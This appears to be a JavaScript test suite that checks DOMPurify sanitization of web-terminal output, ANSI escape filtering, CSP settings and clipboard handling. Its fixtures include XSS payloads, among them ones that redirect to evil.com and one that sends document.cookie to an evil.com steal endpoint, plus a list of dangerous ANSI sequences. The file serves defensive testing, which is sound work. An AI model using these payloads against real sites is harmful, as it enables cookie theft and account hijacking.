/**
 * Security Test Suite: XSS Prevention in Terminal Output
 * OWASP Compliance: Cross-Site Scripting Prevention
 */

const { expect } = require('chai');
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

// Setup JSDOM environment
const window = new JSDOM('').window;
const purify = DOMPurify(window);

describe('XSS Prevention in Terminal Output', () => {

  describe('Terminal Output Sanitization', () => {
    const maliciousTerminalOutputs = [
      // Basic XSS attempts
      'Command executed: <script>alert("XSS")</script>',
      'Error: <img src=x onerror=alert("XSS")>',
      'Output: "><script>fetch("/steal-data")</script>',

      // ANSI escape sequence attacks
      '\x1b[2J\x1b[H<script>alert("XSS")</script>',
      '\x1b]0;title\x07<script>alert("XSS")</script>',
      '\x1b[31mError:\x1b[0m <script>alert("XSS")</script>',

      // Terminal command injection via output
      'npm install completed\n<script>document.location="http://evil.com"</script>',
      'Build successful: <svg onload=alert("Build compromised")>',

      // Base64 encoded attacks
      'Data: <img src="" onerror="eval(atob(\'YWxlcnQoIlhTUyIp\'))">',

      // CSS injection attacks
      'Style: <style>body{background:url("javascript:alert(\'XSS\')")}</style>',

      // DOM manipulation attempts
      'Result: <div onclick="window.location=\'http://evil.com\'">Click me</div>',

      // Event handler injections
      '<button onmouseover="alert(\'XSS\')">Hover attack</button>',

      // Data URI attacks
      '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',

      // SVG-based XSS
      '<svg><script>alert("SVG XSS")</script></svg>',

      // Unicode-based attacks
      '<img src="" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',

      // WebSocket message attacks
      'WS Message: {"type":"execute","code":"<script>alert(\'XSS\')</script>"}',

      // Terminal escape sequences for cursor manipulation
      '\x1b[999C<script>alert("Cursor XSS")</script>',

      // Protocol handler attacks
      '<a href="javascript:alert(\'XSS\')">Click</a>',

      // Form-based attacks
      '<form action="javascript:alert(\'XSS\')" method="post"><button type="submit">Submit</button></form>'
    ];

    maliciousTerminalOutputs.forEach((output, index) => {
      it(`should sanitize malicious terminal output ${index + 1}`, () => {
        const sanitized = purify.sanitize(output, {
          ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'span', 'div', 'pre', 'code'],
          ALLOWED_ATTR: ['class', 'style'],
          FORBID_TAGS: ['script', 'object', 'embed', 'iframe', 'form', 'input', 'button'],
          FORBID_ATTR: ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur']
        });

        // Verify dangerous elements are removed
        expect(sanitized).to.not.include('<script');
        expect(sanitized).to.not.include('javascript:');
        expect(sanitized).to.not.include('onerror=');
        expect(sanitized).to.not.include('onload=');
        expect(sanitized).to.not.include('alert(');
        expect(sanitized).to.not.include('document.location');
        expect(sanitized).to.not.include('window.location');
        expect(sanitized).to.not.include('eval(');

        console.log(`Terminal XSS Test ${index + 1}:`);
        console.log(`Input: ${output.substring(0, 100)}...`);
        console.log(`Sanitized: ${sanitized.substring(0, 100)}...`);
      });
    });
  });

  describe('ANSI Escape Sequence Security', () => {
    const dangerousAnsiSequences = [
      '\x1b]0;malicious title\x07', // Window title manipulation
      '\x1b[2J\x1b[H', // Clear screen and home cursor
      '\x1b[999;999H', // Cursor positioning
      '\x1b[6n', // Request cursor position (can leak info)
      '\x1b]52;c;bWFsaWNpb3VzIGRhdGE=\x07', // Clipboard manipulation
      '\x1b[?47h', // Switch to alternate screen buffer
      '\x1b[?1049h', // Enable alternate screen buffer
      '\x1b[?25l', // Hide cursor
      '\x1b[?9h', // Enable X10 mouse reporting
      '\x1b[?1000h', // Enable VT200 mouse reporting
      '\x1b[?1002h', // Enable button event mouse reporting
      '\x1b[?1003h', // Enable all mouse tracking
      '\x1b[?1006h', // Enable SGR mouse reporting
      '\x1b[?1015h', // Enable urxvt mouse reporting
      '\x1b[>4;2m', // Set modifyOtherKeys mode
      '\x1b[?2004h' // Enable bracketed paste mode
    ];

    const safeAnsiCodes = [
      '\x1b[31m', // Red text
      '\x1b[32m', // Green text
      '\x1b[33m', // Yellow text
      '\x1b[1m',  // Bold text
      '\x1b[0m',  // Reset formatting
      '\x1b[4m',  // Underline
      '\x1b[7m'   // Reverse video
    ];

    it('should filter dangerous ANSI escape sequences', () => {
      dangerousAnsiSequences.forEach((sequence, index) => {
        // In a real implementation, these would be filtered out
        const containsDangerousSequence = /\x1b\]|\x1b\[[\d;]*[HJKmhlnpq]|\x1b\[>[^m]*m|\x1b\[\?[\d;]*[hlmprsuvwx]/g.test(sequence);

        if (containsDangerousSequence) {
          console.log(`Dangerous ANSI sequence ${index + 1} detected: ${JSON.stringify(sequence)}`);
        }
      });
    });

    it('should allow safe ANSI formatting codes', () => {
      safeAnsiCodes.forEach((code, index) => {
        // These should be allowed for terminal formatting
        const isSafeFormatting = /^\x1b\[[\d;]*m$/.test(code);
        expect(isSafeFormatting).to.be.true;
        console.log(`Safe ANSI code ${index + 1}: ${JSON.stringify(code)}`);
      });
    });
  });

  describe('Terminal Content Security Policy', () => {
    it('should implement CSP for terminal content', () => {
      const cspPolicy = {
        'default-src': "'self'",
        'script-src': "'none'",
        'object-src': "'none'",
        'style-src': "'self' 'unsafe-inline'",
        'img-src': "'self' data:",
        'media-src': "'none'",
        'frame-src': "'none'",
        'font-src': "'self'",
        'connect-src': "'self' ws: wss:",
        'worker-src': "'none'",
        'child-src': "'none'",
        'form-action': "'none'",
        'base-uri': "'self'",
        'upgrade-insecure-requests': true
      };

      // Verify CSP policy strength
      expect(cspPolicy['script-src']).to.equal("'none'");
      expect(cspPolicy['object-src']).to.equal("'none'");
      expect(cspPolicy['frame-src']).to.equal("'none'");

      console.log('Terminal CSP Policy:', JSON.stringify(cspPolicy, null, 2));
    });
  });

  describe('Real-time Output Filtering', () => {
    it('should filter streaming terminal output in real-time', () => {
      const streamChunks = [
        'Normal output line 1\n',
        'Normal output <script>',
        'alert("XSS")</script> line 2\n',
        'ANSI colors: \x1b[31mRed\x1b[0m\n',
        'Dangerous: \x1b]0;title\x07\n',
        'More normal output\n'
      ];

      const filteredChunks = streamChunks.map(chunk => {
        // Remove script tags
        let filtered = chunk.replace(/<script[^>]*>.*?<\/script>/gi, '[SCRIPT_REMOVED]');

        // Remove dangerous ANSI sequences but keep safe formatting
        filtered = filtered.replace(/\x1b\][^\\x07]*\x07/g, '[ANSI_TITLE_REMOVED]');

        return filtered;
      });

      filteredChunks.forEach((chunk, index) => {
        expect(chunk).to.not.include('<script');
        expect(chunk).to.not.include('\x1b]0;');
        console.log(`Chunk ${index + 1}: ${JSON.stringify(chunk)}`);
      });
    });
  });

  describe('Terminal Session Isolation', () => {
    it('should isolate terminal sessions from each other', () => {
      const session1Output = 'Session 1: <script>window.session1Data = "compromised"</script>';
      const session2Output = 'Session 2: Normal output';

      // Each session should be sanitized independently
      const sanitizedSession1 = purify.sanitize(session1Output);
      const sanitizedSession2 = purify.sanitize(session2Output);

      expect(sanitizedSession1).to.not.include('<script');
      expect(sanitizedSession2).to.equal(session2Output); // Should remain unchanged

      console.log('Session isolation test passed');
    });
  });

  describe('Terminal Command History Security', () => {
    it('should sanitize command history storage', () => {
      const commandHistory = [
        'npm install',
        'git commit -m "fix: <script>alert(\'XSS\')</script>"',
        'echo "Hello World"',
        'curl -X POST http://example.com -d "<svg onload=alert(\'XSS\')>"'
      ];

      const sanitizedHistory = commandHistory.map(cmd => purify.sanitize(cmd));

      sanitizedHistory.forEach((cmd, index) => {
        expect(cmd).to.not.include('<script');
        expect(cmd).to.not.include('<svg onload');
        console.log(`Command ${index + 1}: ${cmd}`);
      });
    });
  });

  describe('Terminal Clipboard Security', () => {
    it('should sanitize clipboard content before pasting', () => {
      const clipboardContent = '<script>document.location="http://evil.com/steal?data="+document.cookie</script>';
      const sanitized = purify.sanitize(clipboardContent);

      expect(sanitized).to.not.include('<script');
      expect(sanitized).to.not.include('document.location');
      expect(sanitized).to.not.include('document.cookie');

      console.log(`Clipboard sanitization: "${clipboardContent}" -> "${sanitized}"`);
    });
  });
});